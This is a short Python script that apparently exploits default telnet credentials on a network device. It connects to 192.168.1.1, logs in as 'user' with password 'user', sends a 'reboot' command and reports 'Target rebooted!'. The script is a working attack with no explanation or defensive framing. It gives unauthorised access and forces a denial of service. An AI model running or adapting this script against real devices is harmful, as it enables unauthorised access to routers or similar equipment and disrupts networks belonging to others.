from telnetlib import Telnet 

target = "192.168.1.1"

host = Telnet(target)
host.write(b"user\r\n")
host.write(b"user\r\n")
host.write(b"reboot\r\n")

print("-> Target rebooted!")